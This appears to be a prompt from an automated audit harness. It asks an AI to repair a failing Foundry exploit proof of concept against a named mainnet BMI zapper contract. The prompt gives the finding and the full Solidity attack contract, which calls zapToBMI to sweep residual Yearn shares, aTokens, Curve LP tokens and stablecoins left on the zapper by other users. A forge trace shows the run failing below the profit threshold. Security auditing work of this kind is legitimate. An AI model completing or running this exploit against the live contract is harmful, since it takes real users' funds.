You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Derivative unwinds and mint accounting use whole-contract balances instead of the current zap's deltas
- claim: Multiple paths process the zapper's entire holdings rather than the amount attributable to the current caller. Yearn inputs call `withdraw()` with no share amount, Yearn-CRV paths forward `IERC20(crvToken).balanceOf(address(this))` and then `IERC20(USDC).balanceOf(address(this))`, Aave withdrawals use `type(uint256).max`, and the mint helpers repeatedly read `balanceOf(address(this))` for primitives and BMI constituents. Any residual derivative, primitive, or constituent tokens already sitting on the zapper are therefore pulled into the current caller's mint/refund flow.
- impact: A later caller can permissionlessly capture assets left on the zapper from prior users, accidental transfers, failed integrations, or unrefunded dust. This enables direct theft of contract-held Yearn shares, aTokens, Curve LP tokens, USDC, and BMI constituent tokens.
- exploit_paths: ["Residual `yUSDC` or `yCRV` shares exist on the zapper; an attacker submits a dust zap with the same token; `withdraw()` at lines 270/282 unwraps the entire share balance and the resulting assets are minted into BMI for the attacker.", "Residual `aUSDC` exists on the zapper; an attacker calls `zapToBMI` with a dust `aUSDC` amount; `withdraw(_fromUnderlying, type(uint256).max, ...)` at line 310 redeems the full aToken position and converts it for the attacker.", "Residual USDC or supported BMI constituents remain on the zapper; any later zap reaches lines 326/434/454/489/533/556/571/581 and folds those whole balances into the new caller's mint/refund outcome."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IYearn {
    function pricePerShare() external view returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

interface IBasket {
    function getOne() external view returns (address[] memory, uint256[] memory);
    function getAssetsAndBalances() external view returns (address[] memory, uint256[] memory);
}

interface IBMIZapper {
    function BMI() external view returns (address);
    function calcUSDCEquilavent(address _from, uint256 _amount) external view returns (uint256);

    function zapToBMI(
        address _from,
        uint256 _amount,
        address _fromUnderlying,
        uint256 _fromUnderlyingAmount,
        uint256 _minBMIRecv,
        address[] calldata _bmiConstituents,
        uint256[] calldata _bmiConstituentsWeightings,
        address _aggregator,
        bytes calldata _aggregatorData,
        bool refundDust
    ) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0x4622aFF8E521A444C9301dA0efD05f6b482221b8;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant USDP = 0x1456688345527bE1f37E9e627DA0837D6f08C925;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant ALUSD = 0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9;
    address internal constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;
    address internal constant USDN = 0x674C6Ad92Fd080e4004b2312b45f796a192D27a0;

    address internal constant yDAI = 0x19D3364A399d251E894aC732651be8B0E4e85001;
    address internal constant yUSDC = 0x5f18C75AbDAe578b483E5F43f12a39cF75b973a9;
    address internal constant yUSDT = 0x7Da96a3891Add058AdA2E826306D812C638D87a7;
    address internal constant yTUSD = 0x37d19d1c4E1fa9DC47bD1eA12f742a0887eDa74a;
    address internal constant ySUSD = 0xa5cA62D95D24A4a350983D5B8ac4EB8638887396;

    address internal constant yCRV = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
    address internal constant ycrvSUSD = 0x5a770DbD3Ee6bAF2802D29a901Ef11501C44797A;
    address internal constant ycrvYBUSD = 0x8ee57c05741aA9DB947A744E713C15d4d19D8822;
    address internal constant ycrvBUSD = 0x6Ede7F19df5df6EF23bD5B9CeDb651580Bdf56Ca;
    address internal constant ycrvUSDP = 0xC4dAf3b5e2A9e93861c3FBDd25f1e943B8D87417;
    address internal constant ycrvFRAX = 0xB4AdA607B9d6b2c9Ee07A275e9616B84AC560139;
    address internal constant ycrvALUSD = 0xA74d4B67b3368E83797a35382AFB776bAAE4F5C8;
    address internal constant ycrvLUSD = 0x5fA5B62c8AF877CB37031e0a3B2f34A78e3C56A6;
    address internal constant ycrvUSDN = 0x3B96d491f067912D18563d56858Ba7d6EC67a6fa;
    address internal constant ycrvIB = 0x27b7b1ad7288079A66d12350c828D3C00A6F07d7;
    address internal constant ycrvThree = 0x84E13785B5a27879921D6F685f041421C7F482dA;
    address internal constant ycrvDUSD = 0x30FCf7c6cDfC46eC237783D94Fc78553E79d4E9C;
    address internal constant ycrvMUSD = 0x8cc94ccd0f3841a468184aCA3Cc478D2148E1757;
    address internal constant ycrvUST = 0x1C6a9783F812b3Af3aBbf7de64c3cD7CC7D1af44;

    address internal constant aDAI = 0x028171bCA77440897B824Ca71D1c56caC55b68A3;
    address internal constant aUSDC = 0xBcca60bB61934080951369a648Fb03DF4F96263C;
    address internal constant aUSDT = 0x3Ed3B47Dd13EC9a98b44e6204A523E766B225811;
    address internal constant aTUSD = 0x101cc05f4A51C0319f570d5E146a8C625198e636;
    address internal constant aSUSD = 0x6C5024Cd4F8A59110119C56f8933403A539555EB;

    address internal constant crvSUSDPool = 0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;

    IBMIZapper internal constant ZAPPER = IBMIZapper(TARGET);

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address bmi = ZAPPER.BMI();
        uint256 startUSDC = _balanceOf(USDC, address(this));
        uint256 startBMI = _balanceOf(bmi, address(this));

        (address[] memory constituents, uint256[] memory weightings) = _buildWeightings(bmi);
        if (constituents.length == 0 || constituents.length != weightings.length) {
            _setProfit(startUSDC, startBMI, bmi);
            return;
        }

        // Keep the original exploit ordering, but only enter branches that have
        // actual residual balances on the zapper.
        //
        // The failing run showed the old verifier was manufacturing false
        // negatives by probing unsupported zero-amount routes:
        // - non-core primitive paths revert when `_aggregator` is address(0)
        // - some tokens reject zero-value transferFrom outright
        //
        // The bug itself is unchanged: once a reachable branch is entered, the
        // zapper consumes whole-contract balances instead of caller deltas.
        _attemptYearnPrimitivePaths(constituents, weightings);
        _attemptYearnCrvPaths(constituents, weightings);
        _attemptAavePaths(constituents, weightings);
        _attemptPrimitivePaths(constituents, weightings);

        _setProfit(startUSDC, startBMI, bmi);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptYearnPrimitivePaths(address[] memory constituents, uint256[] memory weightings) internal {
        // Only direct-underlying vaults are viable without introducing an
        // external swap adapter. This keeps the Yearn exploit path intact while
        // avoiding known zero-address-aggregator failures for TUSD/SUSD routes.
        address[3] memory vaults = [yDAI, yUSDC, yUSDT];
        for (uint256 i = 0; i < vaults.length; ++i) {
            if (_balanceOf(vaults[i], TARGET) == 0) {
                continue;
            }
            _attemptZap(vaults[i], _yearnUnderlying(vaults[i]), constituents, weightings);
        }
    }

    function _attemptYearnCrvPaths(address[] memory constituents, uint256[] memory weightings) internal {
        address[14] memory vaults = [
            yCRV,
            ycrvSUSD,
            ycrvYBUSD,
            ycrvBUSD,
            ycrvUSDP,
            ycrvFRAX,
            ycrvALUSD,
            ycrvLUSD,
            ycrvUSDN,
            ycrvIB,
            ycrvThree,
            ycrvDUSD,
            ycrvMUSD,
            ycrvUST
        ];

        for (uint256 i = 0; i < vaults.length; ++i) {
            if (_balanceOf(vaults[i], TARGET) == 0) {
                continue;
            }
            _attemptZap(vaults[i], USDC, constituents, weightings);
        }
    }

    function _attemptAavePaths(address[] memory constituents, uint256[] memory weightings) internal {
        // Same rationale as the direct Yearn routes: only underlyings that do
        // not require an external aggregator are exercised in this verifier.
        address[3] memory aTokens = [aDAI, aUSDC, aUSDT];
        for (uint256 i = 0; i < aTokens.length; ++i) {
            if (_balanceOf(aTokens[i], TARGET) == 0) {
                continue;
            }
            _attemptZap(aTokens[i], _aaveUnderlying(aTokens[i]), constituents, weightings);
        }
    }

    function _attemptPrimitivePaths(address[] memory constituents, uint256[] memory weightings) internal {
        bool hasConstituentResidual = _hasAnyConstituentResidual(constituents);

        // Any later bare-token zap reaches the whole-balance mint/refund helpers.
        // We deliberately use core primitives here because they are directly
        // consumable by `_primitiveToBMI` and avoid the aggregator-dependent
        // routes that the failing logs proved were not mechanically viable.
        if (_balanceOf(DAI, TARGET) > 0 || hasConstituentResidual) {
            _attemptZap(DAI, DAI, constituents, weightings);
        }
        if (_balanceOf(USDC, TARGET) > 0 || hasConstituentResidual) {
            _attemptZap(USDC, USDC, constituents, weightings);
        }
        if (_balanceOf(USDT, TARGET) > 0 || hasConstituentResidual) {
            _attemptZap(USDT, USDT, constituents, weightings);
        }
    }

    function _attemptZap(
        address from,
        address fromUnderlying,
        address[] memory constituents,
        uint256[] memory weightings
    ) internal {
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IBMIZapper.zapToBMI.selector,
                from,
                0,
                fromUnderlying,
                0,
                0,
                constituents,
                weightings,
                address(0),
                bytes(""),
                true
            )
        );
        ok;
    }

    function _buildWeightings(address bmi) internal view returns (address[] memory assets, uint256[] memory weightings) {
        uint256[] memory one;

        try IBasket(bmi).getOne() returns (address[] memory _assets, uint256[] memory _one) {
            assets = _assets;
            one = _one;
        } catch {
            try IBasket(bmi).getAssetsAndBalances() returns (address[] memory _assets, uint256[] memory _balances) {
                assets = _assets;
                one = _balances;
            } catch {
                return (assets, weightings);
            }
        }

        if (assets.length == 0 || assets.length != one.length) {
            return (assets, weightings);
        }

        weightings = new uint256[](assets.length);
        uint256[] memory usdcQuotes = new uint256[](assets.length);
        uint256 totalQuote;

        for (uint256 i = 0; i < assets.length; ++i) {
            usdcQuotes[i] = _quoteUSDC(assets[i], one[i]);
            totalQuote += usdcQuotes[i];
        }

        if (totalQuote == 0) {
            uint256 equalWeight = 1e18 / assets.length;
            uint256 acc;
            for (uint256 i = 0; i + 1 < assets.length; ++i) {
                weightings[i] = equalWeight;
                acc += equalWeight;
            }
            weightings[assets.length - 1] = 1e18 - acc;
            return (assets, weightings);
        }

        uint256 sumWeights;
        for (uint256 i = 0; i + 1 < assets.length; ++i) {
            uint256 w = (usdcQuotes[i] * 1e18) / totalQuote;
            weightings[i] = w;
            sumWeights += w;
        }
        weightings[assets.length - 1] = 1e18 - sumWeights;
    }

    function _quoteUSDC(address asset, uint256 amount) internal view returns (uint256) {
        if (amount == 0) {
            return 0;
        }

        if (_isYearnPrimitive(asset)) {
            uint256 underlying = (amount * IYearn(asset).pricePerShare()) / 1e18;
            if (asset == ySUSD) {
                return ICurvePool(crvSUSDPool).get_dy(3, 1, underlying);
            }
            return _normalizeToUSDC(_yearnUnderlying(asset), underlying);
        }

        if (_isYearnCrv(asset)) {
            try ZAPPER.calcUSDCEquilavent(asset, amount) returns (uint256 quoted) {
                return quoted;
            } catch {
                return 0;
            }
        }

        return _normalizeToUSDC(asset, amount);
    }

    function _yearnUnderlying(address vault) internal pure returns (address) {
        if (vault == yDAI) {
            return DAI;
        }
        if (vault == yUSDC) {
            return USDC;
        }
        if (vault == yUSDT) {
            return USDT;
        }
        if (vault == yTUSD) {
            return TUSD;
        }
        return SUSD;
    }

    function _aaveUnderlying(address aToken) internal pure returns (address) {
        if (aToken == aDAI) {
            return DAI;
        }
        if (aToken == aUSDC) {
            return USDC;
        }
        if (aToken == aUSDT) {
            return USDT;
        }
        if (aToken == aTUSD) {
            return TUSD;
        }
        return SUSD;
    }

    function _normalizeToUSDC(address asset, uint256 amount) internal view returns (uint256) {
        uint8 decimals;
        try IERC20(asset).decimals() returns (uint8 d) {
            decimals = d;
        } catch {
            return 0;
        }

        if (decimals == 6) {
            return amount;
        }
        if (decimals > 6) {
            return amount / (10 ** (decimals - 6));
        }
        return amount * (10 ** (6 - decimals));
    }

    function _setProfit(uint256 startUSDC, uint256 startBMI, address bmi) internal {
        uint256 endBMI = _balanceOf(bmi, address(this));
        if (endBMI > startBMI) {
            _profitToken = bmi;
            _profitAmount = endBMI - startBMI;
            return;
        }

        uint256 endUSDC = _balanceOf(USDC, address(this));
        if (endUSDC > startUSDC) {
            _profitToken = USDC;
            _profitAmount = endUSDC - startUSDC;
        }
    }

    function _hasAnyConstituentResidual(address[] memory constituents) internal view returns (bool) {
        for (uint256 i = 0; i < constituents.length; ++i) {
            if (_balanceOf(constituents[i], TARGET) > 0) {
                return true;
            }
        }
        return false;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _isYearnPrimitive(address token) internal pure returns (bool) {
        return token == yDAI || token == yUSDC || token == yUSDT || token == yTUSD || token == ySUSD;
    }

    function _isYearnCrv(address token) internal pure returns (bool) {
        return token == yCRV ||
            token == ycrvSUSD ||
            token == ycrvYBUSD ||
            token == ycrvBUSD ||
            token == ycrvUSDP ||
            token == ycrvFRAX ||
            token == ycrvALUSD ||
            token == ycrvLUSD ||
            token == ycrvUSDN ||
            token == ycrvIB ||
            token == ycrvThree ||
            token == ycrvDUSD ||
            token == ycrvMUSD ||
            token == ycrvUST;
    }
}

```

forge stdout (tail):
```
4C211a69Ad9308BA0B6CDb3EA0bB2B05::bd6d894d() [delegatecall]
    │   │   │   │   │   ├─ [2965] 0x5931ee26A25b8d4BA3ced3dC32653606a76A7612::15f24053(000000000000000000000000000000000000000000000bc6ffb31c5a535859eb000000000000000000000000000000000000000000032290edac3b93187b5aaf00000000000000000000000000000000000000000000033017923448aecd4d54) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000004895eaff45
    │   │   │   │   │   ├─  emit topic 0: 0x4dec04e750ca11537cabcd8a9eab06494de08da3735bc8871cd41250e190bc04
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000bc6ffb31c5a535859eb00000000000000000000000000000000000000000000000179230bdc9388932100000000000000000000000000000000000000000000000013b32fe018eb1a2900000000000000000000000000000000000000000003229266cf476fac03edd0
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000665ddaa1ff26d689864cca
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000665ddaa1ff26d689864cca
    │   │   │   ├─ [29961] 0x76Eb2FE28b36B3ee97F3Adae0C69606eeDB2A37c::bd6d894d()
    │   │   │   │   ├─ [29246] 0x7e8844Ea4C211a69Ad9308BA0B6CDb3EA0bB2B05::bd6d894d() [delegatecall]
    │   │   │   │   │   ├─ [2115] 0x5931ee26A25b8d4BA3ced3dC32653606a76A7612::15f24053(0000000000000000000000000000000000000000000000000000012faf5903aa00000000000000000000000000000000000000000000000000000871bb82e18500000000000000000000000000000000000000000000000000000003122ee3fd) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000936c893eb
    │   │   │   │   │   ├─  emit topic 0: 0x4dec04e750ca11537cabcd8a9eab06494de08da3735bc8871cd41250e190bc04
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000012faf5903aa000000000000000000000000000000000000000000000000000000000080f2ec000000000000000000000000000000000000000000000000119071d0876046a700000000000000000000000000000000000000000000000000000871bc03d471
    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000006728127b1da4
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000006728127b1da4
    │   │   │   ├─ [29961] 0x48759F220ED983dB51fA7A8C0D2AAb8f3ce4166a::bd6d894d()
    │   │   │   │   ├─ [29246] 0x7e8844Ea4C211a69Ad9308BA0B6CDb3EA0bB2B05::bd6d894d() [delegatecall]
    │   │   │   │   │   ├─ [2115] 0x5931ee26A25b8d4BA3ced3dC32653606a76A7612::15f24053(0000000000000000000000000000000000000000000000000000012eca47fd270000000000000000000000000000000000000000000000000000095d2b9fa305000000000000000000000000000000000000000000000000000000091e048d69) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000936c893eb
    │   │   │   │   │   ├─  emit topic 0: 0x4dec04e750ca11537cabcd8a9eab06494de08da3735bc8871cd41250e190bc04
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000012eca47fd2700000000000000000000000000000000000000000000000000000000008efe32000000000000000000000000000000000000000000000000164efa57ca8249750000000000000000000000000000000000000000000000000000095d2c2ea137
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000793cd3c8284d
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000793cd3c8284d
    │   │   │   ├─ [611] 0x5282a4eF67D9C33135340fB3289cc1711c13638C::18160ddd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000423ed188c13913129aac0
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [1107] 0x0aC00355F80E289f53BF368C9Bdb70f5c114C44B::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [598] 0xE2792dBAa268631A3858BF831b76baFC1A8a4362::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2289] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x2dded6Da1BF5DBdF597C45fcFaa3194e53EcfeAF
  at 0x4622aFF8E521A444C9301dA0efD05f6b482221b8.zapToBMI
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 42.35ms (21.01ms CPU time)

Ran 1 test suite in 52.32ms (42.35ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2074697)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
